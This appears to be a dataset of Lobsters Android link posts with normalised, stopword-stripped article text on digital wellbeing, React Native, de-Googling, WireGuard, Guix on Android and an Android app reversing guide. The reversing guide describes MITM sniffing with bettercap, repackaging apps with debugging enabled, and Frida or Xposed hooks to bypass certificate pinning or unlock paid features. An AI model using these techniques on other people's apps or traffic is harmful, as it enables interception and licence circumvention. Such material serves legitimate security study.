176,Lobsters,android,Android,Google’s Plan To Make Tech Less Addictive,https://www.fastcodesign.com/90171307/googles-plan-to-make-tech-less-addictive,google plan make tech le addictive,making u unhappy digital wellbeing michael mroczek unsplash shush idea wind mac dashboard data view,know smartphones making u unhappy annual developer conference week google revealed user actually want help balancing digital life clear smartphone manufacturer world business interest make phone possibleyet io google introduced clever aggressive response habitforming product broad initiative called digital wellbeing ceo sundar pichai say ultimately affect every google product clear technology powerful force equally clear wideeyed said pichai stage google io conference feel deep sense responsibility get right google upcoming android p operating system introducing three great feature help u least better screen addiction photo michael mroczekunsplash shushwith feature called shush android p automatically silence call notification flip phone screen side mean push button dig deep setting menu put phone put phone downwhat particularly brilliant shush gesture modeled directly behavior many u already place phone facedown table meal like enjoy friend family gesture become powerful software supporting desired behavior incidentally design nerd may notice motorola developed idea year definitely widely adopted part android p image google wind heard people checked phone right bed knew hour two went say sameer samat vp product management google google apple already introduced warm color shifting mode night phone blue light disrupt natural sleep cycle digital wellbeing google feature called wind mode turn phone grayyou set wind like go bed android p shift grayscale palette take slot machinestyle delight phone essentially turn device mac image google dashboard data viewmost study show check phone time day sort generalized stat easy brush android p personalized data visualization actual phone usage many time checked day many push notification received even display inside various front third party developer able specify trackable metric inside softwareexactly specific tracking get still bit imagine something like john spent six hour watching anime cartoon minute watching geometry proof google want push call meaningful engagement garbage time phone hopefully developer feel way within data view also able set something akin parental control asking apps like youtube notify watched daily limit videosof course new feature still seem offer user option override selfregulatory decision reenable phone like throwing pack cigarette prevent anyone stopping gas station grab another digital wellbeing launched hopefully first experiment google trying make phone healthier part life looking next apple
177,Lobsters,android,Android,"The ecosystem of React Native can be improved, beyond technically",http://cs.mcgill.ca/~mxia3/2018/05/09/the-ecosystem-of-react-native-can-be-improved-beyond-technically/,ecosystem react native improved beyond technically,others calvin payment hit miss native abstraction community fragmentation release management benefit improvement separate repo towards better react native ecosystem,react native fantastic tool brings wellreceived react onto mobile platform enables developer program platform agnostic mobile apps using modern tool technique today many apps large user base written react native airbnb discord instagram others given wide adoption well amazing ease target io android single code base ideal choice calvin payment solution cofounder created help people pay restaurant bill faster easily practice developing react native bittersweet experience hit miss native abstractionsreactnative promise unified abstraction io android ie write run platform practice complicated nontrivial app typical content driven apps fetch data remote apis display screen might problem interacting camera processing payment apple pay accessing location service background task possible without interacting native code unfortunately writing react native library native code targeting io android simple task take look popular library issue platform specific isolated case common pattern community community fragmented adoption newer version user slow upgrading nontrivial reward effort people till best way upgrade react native use reactnativegitupgrader although tool us git automatically resolve lot merging decision user still need perform threewaymerging multiple conflict process time consuming prone mistake newer version react native may provide additional feature bug fix also come cost regression bug result unless new feature bug fix fundamental developer take broken fix position keeping date react native increase effort library author often working time make sure library work multiple version react native release management benefit improvementsrn developed fast pace average commits get pushed repo every week managing release across multiple minor version hard task many user complained patch blocking regression cherrypicked patch version release least timely manner consequently many user forced apply patch fork compiling react native source adding significant time build past attempt crowdsource commits cherrypicked stable release issue got lost quickly pile newly created issue barely attracting enough attention newer release tracking issue minor release separate repo hopefully remedy issue facing stable release towards better react native ecosystemwith popular react native became shortage contribution experience developer newcomer trying build brand issue mentioned often entirely technical library maintainer course write integration endtoend test cover multiple platform across multiple react native release balance need carefully maintained keeping quality project high versus encouraging open source contribution ecosystem react native pleasing contributor way much merging patch given enough thought result lot platform specific bug contributor code one io android majority library consumer reluctant keep date wanting spend week discovering hidden regression bug finally like jeff geerling spoke default response pull request
179,Lobsters,android,Android,Android Applications Reversing 101 (2017),https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/,android application reversing,smart fitness device smart coffee machine secure basic practical guide prerequisite java programming language jre adb apk apk email protected email protected get apk app network analysis bettercap public key pinning every application static analysis apktool jadx jadx jdgui jdgui jeb jeb static analysis native binary jni hexrays ida hopper dynamic analysis obfuscated sandboxing cuckoodroid joe sandbox sample report debugging android studio document dynamic instrumentation frida rtfm xposed framework requires wiki project wiki user contributed module conclusion,every day see bunch new android application published google play store game utility iot device client forth almost every single aspect life somehow controlled app smart house smart fitness device smart coffee machine stuff smart secure well reversing android application relatively easy fun way answer question decided write blog post try explain basic give trick reverse stuff faster effectively going go deep technical detail learn android work dalvik vm work forth gon na basic practical guide instead post full theoretical stuff really useful content let start prerequisitesin order follow introduction apk reversing prerequisite working brain give granted anymore android smartphone doh basic knowledge java programming language understand read jre installed computer adb installed developer option usb debugging enabled smartphone apk android application packaged apk android package file essentially zip file containing compiled code resource signature manifest every file software need order run zip file start looking content using unzip command line utility unarchiver use unzip applicationapk application find inside apk androidmanifestxml file binary representation xml manifest file describing permission application request keep mind permission might requested runtime app declared activity gui service stuff running background ui receiver class receive handle system event device boot incoming sm decompiled later look like xml version encoding standalone manifest xmlns android http schemasandroidcomapkresandroid package comcompanyappname platformbuildversioncode platformbuildversionname usespermission android name androidpermissionwriteexternalstorage usespermission android name androidpermissioninternet application android allowbackup true android icon mipmapiclauncher android label stringappname android supportsrtl true android theme styleapptheme activity android name comcompanyappnamemainactivity intentfilter action android name androidintentactionmain category android name androidintentcategorylauncher intentfilter activity application manifest keep mind perfect starting point isolate application entry point namely class reverse first order understand logic whole software case instance would start inspecting comcompanyappnamemainactivity class declared main ui application asset folder folder contain application specific file like wav file app might need play custom font reversingwise usually important unless course find inside software functional reference file re folder resource like activity xml file image custom style stored resourcesarsc file index resource long story short resource file assigned numeric identifier app use order identify specific entry resourcesarsc file map file identifier nothing interesting classesdex file file contains dalvik virtual machine running android application bytecode app let explain better android application time developed using java programming language java source file compiled bytecode dalvik vm eventually execute pretty much happens normal java program compiled class file long story short file contains logic interested sometimes also find file due dex format limit number class declare inside single dex file point history android apps became bigger bigger google adapt format supporting secondary dex file class declared perspective matter tool going use able detect append decompilation pipeline libs folder sometimes app need execute native code image processing library game engine whatever case elf library found inside libs folder divided architecture specific subfolders app run arm etc metainf folder every android application need signed developer certificate order run device even debug build signed debug certificate metainf folder contains information file inside apk developer inside folder usually find manifestmf file hash file inside apk certsf file pretty much like manifestmf signed rsa key certrsa file contains developer public key used sign certsf file digest file important order guarantee apk integrity ownership code sometimes inspecting signature handy determine really developed given apk want get information developer use openssl command line utility openssl pathtoextractedapkmetainfcertrsa inform der print print output like type dsign version mdalgs algorithm parameter null content type ddata absent cert certinfo version serialnumber signature algorithm parameter null issuer ctw sttaiwan ltaipei oasus oupmd cnasus amax key email protected validity notbefore jul gmt notafter nov gmt subject ctw sttaiwan ltaipei oasus oupmd cnasus amax key email protected key algor algorithm rsaencryption parameter null publickey unused bit gold u instance could use information determine app really signed let say google resigned therefore modified third party get apk app basic idea supposed find inside apk need way actually get apk file application interested two way either install device use adb get use online service download pulling app adbfirst let plug smartphone usb port computer get list installed package namespaces adb shell pm list package list package smartphone found namespace package want reverse comandroidsystemui example let see physical path adb shell pm path comandroidsystemui finally apk path package systemprivappsystemuigooglesystemuigoogleapk let pull device adb pull systemprivappsystemuigooglesystemuigoogleapk go apk want reverse using online servicemultiple online service available want install app device instance reversing malware want start file first installing clean device afterwards list one use keep mind download apk service good idea check developer certificate previously shown order sure downloaded correct apk repackaged resigned stuff full ad possibly malware network analysisnow start test order understand app executed first test usually consists inspecting network traffic generated application order tool choice bettercap well developed first place p make sure bettercap installed computer android device wifi network start mitming smartphone example see traffic realtime terminal sudo bettercap x x option enable sniffer soon start app see bunch http andor http server contacted know app sending data let see data sending sudo bettercap proxy proxyhttps nosslstrip switch passive sniffing mode proxying mode http http traffic intercepted neeeded modified bettercapif app correctly using public key pinning every application able see http traffic unfortunately experience happens small number apps keep triggering action app inspecting traffic also use wireshark parallel get pcap capture file inspect later le complete idea protocol using purpose static analysisafter network analysis collected bunch url packet use information starting point looking performing static analysis app static analysis mean execute app rather study code time ever need reverse something different tool use purpose let take look popular one apktool first tool want use capable decompiling androidmanifest file original xml format resourcesarsc file also convert classesdex present file intermediary language called smali asmlike language used represent dalvik vm opcodes human readable language look like ljavalangobject method public static main ljavalangstring v register sgetobject ljavalangsystem ljavaioprintstream conststring hello world invokevirtual ljavaioprintstream println ljavalangstring v returnvoidend method worry case final language gon na read reverse app given apk command line decompile apktool applicationapk finished application folder created find output apktool also use apktool decompile apk modify recompile like nike app order debug log instance unless tool fail decompilation unlikely need read smali code order reverse application let get tool jadxthe jadx suite allows simply load apk look java source code happening hood jadx decompiling apk smali converting smali back java needle say reading java code much easier reading smali already mentioned apk loaded see ui like one best feature jadx stringsymbol search button allow search url string method whatever want find inside codebase app also find usage menu option highlight symbol right click feature give list every reference symbol jdguisimilar jadx jdgui tool installed use convert apk jar file applicationapk jar file simply open jdgui see java code pretty much like jadx unfortunately jdgui feature rich jadx sometimes one tool fails try another one hope lucky jebas last resort try jeb decompiler good software unfortunately free trial version want give shot look like jeb also feature arm disassembler useful native library apk debugger useful dynamic analysis free cheap static analysis native binariesas previously mentioned sometimes find native library shared object inside lib folder apk reading java code find native method declaration like following native string stringfromjni native keyword mean method implementation inside dex file instead declared executed native code trough called java native interface jni close native method also usually find something like hellojni tell native library method implemented case need arm subfolder inside libs folder disassembler order reverse native object idathe first disassembler decompiler every decent reverser know hexrays ida state art reversing tool native code along ida license also buy decompiler license case ida also able rebuild pseudo clike code assembly allowing read higher level representation library logic unfortunately ida expensive software unless reversing native stuff professionaly really worth spending money single tool warez ehm p hopperif budget need reverse native code instead ida give hopper try definitely good complete ida much cheaper good enough case hopper support gnulinux macos window like ida builtin decompiler quite decent considering price dynamic analysiswhen static analysis enough maybe application obfuscated codebase simply big complex quickly isolate routine interested need go dynamic dynamic analysis simply mean execute app like performing network analysis somehow trace execution using different tool strategy method sandboxingsandboxing blackbox dynamic analysis strategy mean going actively trace application code like debugging execute app container log relevant action present report end execution cuckoodroidcuckoodroid android port famous cuckoo sandbox installed configured give activity report url app contacted dns query api call forth joe sandboxthe mobile joe sandbox great online service allows upload apk get activity report without hassle installing configuring anything sample report see kind information pretty much cuckoodroid plus bunch heuristic executed order behaviourally correlate sample known application debuggingif sandboxing enough need get deeper insight application behaviour need debug debugging app case know mean attaching running process debugger software putting breakpoints allow stop execution inspect memory state step code line one one order follow execution graph closely enabling debug modewhen application compiled eventually published google play store usually release build looking meaning debugging disabled developer attach directly order enable debugging need use apktool decompile app apktool applicationapk need edit androidmanifestxml generated file adding android debuggable true attribute application xml node xml version encoding standalone manifest xmlns android http schemasandroidcomapkresandroid package comcompanyappname platformbuildversioncode platformbuildversionname usespermission android name androidpermissionwriteexternalstorage usespermission android name androidpermissioninternet application android allowbackup true android icon mipmapiclauncher android label stringappname android supportsrtl true android theme styleapptheme android debuggable true notice activity android name comcompanyappnamemainactivity intentfilter action android name androidintentactionmain category android name androidintentcategorylauncher intentfilter activity application manifest updated manifest let rebuild app apktool b applicationpath outputapk let resign git clone http githubcomappiumsign java jar signdistsignapkjar outputapk signedapk reinstall device make sure unistalled original version first adb install signedapk proceed debugging app android studioandroid studio official android ide debug mode enabled app directly attach using ide start debugging idaif ida license support dalvik debugging attach running process step trough smali code document describes basically idea upload arm debugging server native arm binary device start using adb eventually start debugging session ida dynamic instrumentationdynamic instrumentation mean want modify application behaviour runtime order inject agent app eventually use instrument might want order make app bypass check instance public key pinning enforced might want disable dynamic instrumentation order easily inspect http traffic make show information supposed show unlock pro feature debugadmin activity etc fridafrida great free tool use inject whole javascript engine running process android io many platform javascript engine injected instrument app cool easy way like future import printfunctionimport fridaimport syssession fridaattach hello script sessioncreatescript interceptorattach ptr onenter function args send args int sysargv def onmessage message data print message scripton message onmessage scriptload sysstdinread example inspecting function argument hundred thing frida rtfm use imagination list cool frida resource enjoy xposedanother option instrumenting app using xposed framework xposed basically instrumentation layer whole dalvik vm requires rooted phone order install xposed wiki process called zygote heart android runtime every application started copy fork process started initrc script phone booted process start done systembinappprocess load needed class invokes initialization method xposed come play install framework extended appprocess executable copied systembin extended startup process add additional jar classpath call method certain place instance vm created even main method zygote called inside method part zygote act context jar located datadataderobvandroidxposedinstallerbinxposedbridgejar source code found looking class xposedbridge see main method wrote get called beginning process initialization done also module loaded come back module loading later installed xposed smartphone start developing module follow project wiki instance example would hook updateclock method systemui application order instrument derobvandroidxposedmodstutorial import static derobvandroidxposedxposedhelpersfindandhookmethod import derobvandroidxposedixposedhookloadpackage import derobvandroidxposedxcmethodhook import derobvandroidxposedcallbacksxcloadpackageloadpackageparam public class tutorial implement ixposedhookloadpackage public void handleloadpackage final loadpackageparam lpparam throw throwable lpparampackagenameequals comandroidsystemui return findandhookmethod comandroidsystemuistatusbarpolicyclock lpparamclassloader updateclock new xcmethodhook override protected void beforehookedmethod methodhookparam param throw throwable override protected void afterhookedmethod methodhookparam param throw throwable already lot user contributed module use study modify need conclusioni hope find reference guide useful android reversing adventure keep mind important thing reversing tool using use learn choose appropriate tool scenario something learn experience enough reading start reversing video
181,Lobsters,android,Android,De-Googling my phone,https://piware.de/post/2018-05-01-android-degoogle/,degoogling phone,lineageos alternative app store free apps fdroid mail telegram osmand fennec ublock origin freeotp newpipe night screen secscanqr termux satstat uptodown email mutt rainloop app password note todo list google keep org mode vimorgmode orgzly file syncing syncthing owncloud security issue radicale documentation davdroid http calendargooglecom http contactsgooglecom remaining item trainlineeu http bahnde conclusion update followup,professional free software developer gnulinux area year hobbyist developer user much longer reason never extended much smartphone world beyond running lineageos older phone current sony xperia still warranty fine officially supported android various stab using ubuntu phone rip long weekend year got hold look google fence see free software android reduce dependency google play service google apps le would actually severely distrust google lot business goodwill lose ever majorly screw simple curiosity learning new thing want note experience sharing discussing started experimenting old nexus completely blanking installing current lineageos without google apps provides nice testing ground completely free proprietary google stuff apply good solution production xperia alternative app store free apps number one must course install fdroid app open door surprisingly large good world free software apps already able replace good deal installed apps free alternative mail telegram osmand also available fdroid find preferrable rebuild everything source thus binary seem bit trustworthy previously used opera web browser relatively lightweight important previous phone really good builtin ad blocker day firefox really fast good enough replaced fennec le firefox nonfree bit removed installing ublock origin never looked back apps fairly straightforward replacement google authenticator freeotp youtube newpipe bluefilter night screen qr scanner secscanqr connectbot termux actually magnitude powerful also better terminal implementation gps status satstat apps like google pocketliga got replaced bookmark web site good enough includes google map usually prefer use osmand walking biking general navigationrouting finding commercial thing map usually better however use rarely enough get annoyed much higher latency web page also apps want like whatsapp nextbike quizduell free software alternative uptodown alternative app store require play service lot apps like deutsche bahn navigator requires play service help much email also easy run mail server forever use mutt desktop rainloop occasional web mail access gorgeous phone always loathed gmail web ui never got habit using gmail much except sacrificial spam address random web shop turn surprisingly simple use without gmail app play service create app password use new mail account also simplifies thing deal two different email apps note todo list used google keep long time note todo list android app widget web ui nice nononsense approach work fine perhaps surprisingly thing took longest replace plethora notestodo apps around tested quite discovered org mode powerful flexible plaintextbased system bit like markdown spirit different syntax much powerful primarily emacs extension reasonably good vimorgmode plugin writing desktop much prefer typing keep web ui orgzly android pleasant ui maintaining note also nice widget putting todo list starter screen neither sync device fortunately rather independent task also nice solution see happily used tool two month vimorgmode fit usual workflow desktop much better phone experience significantly different use powerful org feature yet file syncing looking synchronize org note phone laptop stumbled really magnificient syncthing project generalpurpose manytomany file sync solution using modern standard encryption authentication technology readily available debian server fedora laptop fdroid phone installation configuration web android uis straightforward easily used backing photo syncing music ebooks dropbox google drive using type use neither though main disadvantage keep google apps push notification change instance syncthing poll delay propagating update also android keep nagging syncthing running background notification fortunately toned enough android get way power usage obviously something watch noticed significantly worse battery drain far year ago run owncloud quite time mostly store contact calendar take nontrivial amount setup maintance resource server rather high influx security issue went back google eventually today discovered radicale much appealing lightweight python module provides caldavcarddav api bunch standard ic calendar vcf contact file part documentation excellent set service apache reverse proxying server time thing documented well import existing icsvcf file exported google calendarcontacts turn one use standard httpwebdav put request curl u martin mypassword x put http myserverderadicalemartincontacts databinary contactsvcf thing exported ic calendar android installed davdroid added radicale root url userpassword saw two contactcalendar source enabled disabled phone google account phone instead yay data provide web ui calendarcontacts rarely used http calendargooglecom essentially never http contactsgooglecom suppose actually need find replacement might take look roundcube replace rainloop former plugin calendar thunderbird evolution anything similar installed heavyweight rare case deal personal calendar laptop remaining item one remaining app phone need google play service deutsche bahn navigator like use lot information buying ticket next trip give trainlineeu go look promising price http bahnde directly consider bahncard need play service also book train country also wart apps quizduell swa fahrinfo occasionally complain missing play service although work well enough without nextbike one loses life map bike available quite important reasonable alternative look website provides map actually booking bike functionality work fine without play service conclusion learned lot new thing worthwhile experiment beyond mere political idealistic reason however setting google free phone requires significant amount time dedication skill mention personal server definitively far beyond trust mother comprehend reassuring know push come shove definitively still possible useful smartphone running mostly fo google proprietary stuff update posted followup resolve amends issue
182,Lobsters,android,Android,"Exploring React Native Ecosystem - backend, database and best libraries",https://www.simform.com/react-native-ecosystem-backend-database-best-libraries/,exploring react native ecosystem backend database best library,,state management react nativemobx provides functionality update manage app state used react make good candidate state management react simplicity testability also short learning curve thing like async function computed value already handled behind scenesreduxredux predictable state container javascript javascript framework managing maintaining application state usually used conjunction framework build applicationsrelaya powerful framework building data driven application relay powered touted rest successor graphql devs usually chose either two worth noting use complement wellaltunidirectional isomorphic boilerplate free way manage react native apps used use alt lot project redux came picturedebugging tool react nativechrome developer tool simplest way debugging react native code use chrome need install apps press io simulator android emulator shake real device see inapp developer menu tap debug j remotely reactotron reactotron desktop app allows debug react react native apps key feature include inspecting modifying subscribing app state tracking http request made app benchmarking app performance tracking error using redux even dispatch action track saga within reactotrontesting automation tool react nativedetoxdeveloped wix react native detox end end testing library help developer test simulate user behaviour basis user interaction app best part come multiple device configuration permission notification etc user expect appenzymedeveloped airbnb javascript testing utility react enzyme useful assert manipulate traverse output react component intuitive flexible api built mimicking jquery api dom manipulationit compatible almost test runner library theremochamocha javascript test framework run nodejs browser built make asynchronous testing easier fun mochareactnative help easily setup mocha test react nativelokiloki lightweight tool visual regression testing storybookbitbarbitbar cloud based mobile testing framework automating testing react native apps support many open source testing tool appium xcuitest xctest espresso calabash many bitbar also provides rest api support integration various cicd tool jenkins travis ci etcappiumappium open source test automation tool allows developer test native hybrid mobile web apps come react native allows run fully automated test emulator actual device simulatorrobotiumrobotium pretty decent test framework write robust automatic test ui case application developed android robotium developer feasibility write function different acceptance test scenario testing android applicationsjestjest standard automated javascript test runner maintained facebook using jest test react native application developer required write snapshot test save output rendered component file compare component output snapshot consecutive run method useful observing behavioral change component applicationjasminejasmine open source testing framework react native specifically javascript wholebridgebridge provides complete native api access react native app executing j code nodejs hasslefreely test mock free without dig native code go handy using testing tool detox mocha testing frameworktools performance monitoring crash reporting react nativenew relicnew relic mobile apps deeply integrated new relic web mobile browser application share onescreen view making new relic combined service capability solution monitor software matter running app server browser mobile device open source library called react native new relic wix developer worth checking outfabric answersfabric answer let keep eye realtime statistic app consumed user include number active user retention rate session length etc fabric also builtin crashlytics useful track report crashing appbugsnagbugsnag tool help react native developer quickly resolve native j error capturing realtime exception mobile application offer two realtime apis track bug notifier api notifier api bugsnag mainly used alert whenever error exception trackedthe deploy tracking api deploy tracking api bugsnag track multiple deploy version app keep developer informed deploy version error caughtsentrysentry provides open source error tracking show every crash stack happens detail needed prioritize identify reproduce fix issue link react native sdk feeling lazy todaypleakpleak upcoming performance monitoring tool react native apps beta release trial soon sign official website get notified releasetools continuous integration deploymenthere really cool cicd tool may consider using react native project apphubthe apphub service allows developer combine one microapps together global navigation common mechanism user authenticationmicrosoft codepushcodepush cloudbased service microsoft seamlessly provides react native developer deploy overtheair update directly user device act central repository developer publish deploy change html cs javascript imageswith codepush developer find great deal pushing bug fix app without need upload newest version directly appstore wait user update app versionbitrisebitrise great tool continuous integration react native allows run test build app anytime code merged automatically push app end user device deployment best feature bitrise ability integrate bunch service every step development portfoliobuddybuildbuddybuild continuous integration ci continuous deployment cd platform help developer seamlessly build integrate push live update app air without worry integration processfastlanethinking devops fastlane build continuous deployment pipeline mobile apps though solution work well react native often get bit difficult setupcirclecicircleci cloud based system continuous integration deployment native apps working circleci developer access project build artifact complete box solution continuous integration need minimal configuration adjustmentstraviscitravisci another sophisticated well built automation tool help developer help understanding whether application working fully tested reported according build sequence configured said travis ci continuous integration tool aid speed development react nativefabric beta deploymentfabric used catch crash beta build apps live production helpful tracking user metric device used retention daily user etcwatchmanwatchman wonderful tool detect code change thereby providing automatic build push update facility facilitates developer fastly deploy code without refresh code manually one helpful tool available react native open sourcewatchman also made work storyshots automatically generate ui snapshot test developer build view write test timenevercodenevercode api might crazy helpful implement continuous integration react native build best part require write code twice instead scan repository let configure build itpayment provider react native appsreactnativepaypalthough official commit made paypal reactnativepaypal matt foley go great length support react native paypal support io android platformstipsistripesimilar paypal stripe backing sdk react native either thankfully folk tipsi created wrapper tipsistripe help safely integrate stripe appsrazorpaythankfully razorpay created react native wrapper io android apps facilitates making payment app looking payment provider official support razorpay something definitely worth checking outi still know reason giant like paypal stripe committed towards building sdk react native hopefully situation change real soontools push notification react native sendbird sendbird provides chat api messaging sdk inapp messaging mobile apps websitesurban airship library github module react native seamlessly integrate push notification service apps io android developed react native module designed crossplatform therefore possible developer leverage using codebase platformsreact native push notification useful implement local well remote push notification react native android iosonesignal push notification module implementing push notification react nativepushwoosh integrating push notification react native using pushwoosh servicejpush jpush proven largescale app push platform delivers million message daily dedicated react native sdk use easily build push notification servicespushbots pushbots allow react native app send push notification mobile platform accessing dashboardlocalytics provides inapp email remarketing campaign allows trigger instant notification localytics push api joint session event profile data easily create define target segmentsui framework library boilerplatesreact native pop menubuilt developer instea react native popup menu easytouse customizable popup menu react native io android library recently crossed star github actively contributed react native community member timetotime aside react native mobile also work reactnativeweb universal window platform appreact native paperreact native paper developed developer callstackio aim provide material design component react native apps android io paper boast well crafted beautifully designed material design component give exactly yes exactly feel android io platform team callstack announced adding exciting component button toolbars paper etc upcoming version allinall great fan material design like give react native paper trycarbonuicarbonui material design library react native apps work well platform io android extremely customizable come theming animation grid systemsignite clihere thing react native many part many update myriad thing take care devs thankfully ignite cli react native toolchain highly adaptive project starting new react native project checklistnextframedeveloped kyle corbitt next frame library help app break background task chunk block ui operation next frame help build really high performance user interface would note codebase updated since derive great performance minor modificationsreactvirginreactvirgin beautiful ui kit react native brings following ui element table reactnavigation boilerplatehorizontal vertical listbuttons headersgridview chat bubble loaderssnowflakesnowflake originally built boilerplate could help built react native app io android seamless connectivity parse dead hapinativebaseone appreciated ui kit time nativebase cross platform ui kit solution specifically designed provide app truly native look feel offer many option choose form custom component spinner form component floating action button best part implementation module somewhat similar io android platformbuilderxbuilderx great tool react native designer developer design app inside builderx design would automatically produce source code amazing shoutemshoutem ui highly customizable ui kit react native component seamlessly integrate ui make extremely easy develop complex user interfacespepperoni react native starter kitinstead build react native app ground pepperoni react native starter kit help remain focused product development utilising prebuilt react native componentsnachosdeveloped devs avocode nacho ui open source react native based ui kit made aim provide readytouse component react native appteasetthis ui library react native strongly focused feature content display action controlpanzadiligently inspired popular rebass library panza provides set commonly used functional ui component react native component higher degree customization work well platform android iosreact native ui kittenreact native ui kitten framework contains set commonly used ui component styled similar way using library focus business logic take care visual appearanceant design mobileant design ui much react native ui kit many usable ui component modal navigation menu etc name however suggest go minimalistic usage ecosystem since could also cause deal breaker longer run reason go minimalist repository filled issue chinese languagereact native material designif planning use physic animation material design react native app definitely go facebook official material design port react native looking something specific android found something missing react native material kit material react native wellreact native elementsreact native element set element follow platform specific design language great component library building consistent interface across io android device using react nativereact native style tachyonsbuilt upon philosophy functional styling react native style tachyon brings user testing developing ui scale library something definitely check people varying level dev skill going work react native app seen devs use library design system work everyone matter dev skillslists react nativecreating list often onehellofaride react native developer spoke issue react native performance blog post open source library use within react native app avoid issuesreactnativelargelistif used sectionlist would faced issue common really large list view react native reactnativelargelist solves issue exists large list view using sectionlist significantly low cpu usageatozlista fork brett vante listview atozlist brings enhanced performance large list view define configure list height cell structure etc using atozlist wellreactnativescrollablelista scrollable listview component react native ever found situation list item stretch horizontally reactnativescrollablelist youreact native sortable listif ever found situation list item stretch horizontally reactnativesortablelist really amazing work tim gibadullinreactnativesynchronouslistlast september tal kol spoke synchronous rendering react native checked yet check reactnativesynchronouslist make extremely easy implement infinite scroll synchronous rendering otherwise could really huge challengereactnativeimmutablelistviewif immutable data nested object need better performance animated screen transition reactnativeimmutablelistview built keeping three mind seen many replace listview flatlist virtualizedlist library fluidity higher performanceanimations react nativereact native reanimateddeveloped krzysztof magiera react native reanimated library lowlevel abstraction built top official animated api provides much greater flexibility especially come handling gesturebased animation first revealed react europe conferencekrzysztof started working reanimated found official animated library limitation come gesturebased animationsin word krzystof started working reanimated fix matter pan interaction object dragged along screen released snap someplace screen situation despite fact using animatedevent could map gesture state position box make whole interaction run ui thread usenativedriver flag still call back j end gesture u start snap animation animatedspring start used declarative manner get executed side effect starting process animation update value timehere video kryzstof gesture handler reanimated talk react europe conferencereact native interactablereactnativeinteractable animation library specifically focus animation highly interactive nature even interactive demo available app store download mobile see animation build using libraryreact native animatableplanning use animated visual feedback animation system status connected transition state even grab user attention using animation reactnativeanimatable everything needideally suited development general application game react native animated sprite feature rich declarative component particularly used animation tweening dragging us react native animated class tweening react native pan responder dragging actionslottielottie io android react native library render effect animation real time allowing react native apps use animation easily use static image without bringing performance overhead lottie written developer airbnb one hell gem beauty render animation natively misc toolsyarn dependency manager tool react nativeflow flow static type checker help prevent javascript natural ambiguity causing bug applicationstorybook storybook react native design develop individual react native component without running appreact native cli small node application offer simple init command used create new react native application using react native cli create standard react native app necessary file dependency needed build app io android open native project xcode android studioconclusionwhile tried covering much could blog post end somewhere feel something react native ecosystem missed feel free reach rakshit simformcom drop comment
184,Lobsters,android,Android,Wireguard got included in F-Droid,https://f-droid.org/packages/com.wireguard.android/,wireguard got included fdroid,project webpage package download fdroid source tarball download apk pgp signature build log source tarball download apk pgp signature build log source tarball download apk pgp signature build log,wireguard next generation secure network tunnel protocol application allows user connect wireguard tunnel information may found project webpageif device custom kernel containing wireguard module module used superior battery life performance otherwise userspace version work sufficiently device package although apk downloads available give choice aware installing way receive update notification le secure way download recommend install fdroid client use download fdroid version requires android newer built signed fdroid guaranteed correspond source tarball permission take picture video app take picture record video using camera time full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running modify delete content shared storage allows app write content shared storage use biometric hardware allows app use biometric hardware authentication use fingerprint hardware allows app use fingerprint hardware authentication read content shared storage allows app read content shared storage download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission take picture video app take picture record video using camera time full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running modify delete content shared storage allows app write content shared storage use biometric hardware allows app use biometric hardware authentication use fingerprint hardware allows app use fingerprint hardware authentication read content shared storage allows app read content shared storage download apk mib pgp signature build log version requires android newer built signed fdroid guaranteed correspond source tarball permission take picture video app take picture record video using camera time full network access allows app create network socket use custom network protocol browser application provide mean send data internet permission required send data internet run startup allows app started soon system finished booting make take longer start phone allow app slow overall phone always running modify delete content shared storage allows app write content shared storage use biometric hardware allows app use biometric hardware authentication use fingerprint hardware allows app use fingerprint hardware authentication read content shared storage allows app read content shared storage download apk mib pgp signature build log
185,Lobsters,android,Android,Guix on Android!,https://www.gnu.org/software/guix/blog/2018/guix-on-android/,guix android,guix android replicant another foreign distribution could install gnu guix requirement exploring device installing necessary file binary installation guide installing guix create user group running guix enjoy future work gnu guix gnuâ guix respect user freedom guile scheme,guix android julien lepiller april year thought since phone computer running operating system called android replicant android based linux kernel another foreign distribution could install gnu guix right turned absolutely case today reminded irc attempt last year installing gnu guix phone hence blog post try give knowledge command required install android devicerequirementsfirst need android replicant device like installation gnu guix need root access device unfortunately android world often case default need cable connect computer phone hardware place need adb android debugging bridge guix package adbexploring deviceevery android device partioning layout basically work like boot partition booting devicea recovery partition booting device recovery modea data partition user data including application user home etca system partition base system application place phone company put apps ca nt remove thema vendor partition driverssome partitionsduring boot process bootloader look boot partition nt contain filesystem gzipped cpio archive initramfs kernel bootloader load memory kernel start using initramfs init system initramfs load partition respective directory system partition system vendor partition vendor data partition data partition may loadedand android root filesystem actually initramfs modification content lost reboot thankfully android device typically rebooted oftenanother issue android c library libc called bionic le functionality work completely differently gnu libc since guix built glibc need something make work deviceinstalling necessary fileswe follow binary installation guide hardware download corresponding binary releasenow time start using adb connect device obtain root priviledges adb may authorize root access computer phone adb rootnow transfer necessary file adb push guixbinary data glibc need two file networking adb push etcprotocols systemetc adb push etcservices systemetc one perform dns query probably need change nameservers use mobile data adb push etcresolvconf systemetcnote device may systemetc available case etc may available none available create directory using adb shell get shell device push file new directoryinstalling guix itselfnow necessary file present device connect shell device adb shellfrom shell install guix root filesystem mounted readonly nt make sense modify remember ram filesystem remountit readwrite create necessary directory mount remount rw mkdir gnu var mount remount ro ca nt copy content binary archive folder initramfs limited amount space guix complains gnu gnustore symlink one solution consists installing content binary tarball existing partition ca nt modify partition layout easily enough free space typically data partition partition mounted var gnubefore need find data partition system simply run mount grep data see partition mountedwe mount partition extract tarball move content final location mount devblockbootdevicebynameuserdata gnu mount devblockbootdevicebynameuserdata var cd data tar xf guixbinary mv gnustore mv varguix rmdir gnu rmdir varfinally need create user group guix work properly since bionic nt use etcpasswd etcgroup store user need create scratch note addition root user group well nobody user create guix user root glibc cat etcpasswd eof root root data sbinsh nobody nobody usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin guix build user varempty usrbinnologin eof cat etcgroup eof root root guixbuild eofrunning guixfirst install root profile somewhere export homedata ln sf varguixprofilesperuserrootguixprofile homeguixprofilenow finally run guix daemon chrooting impossible device 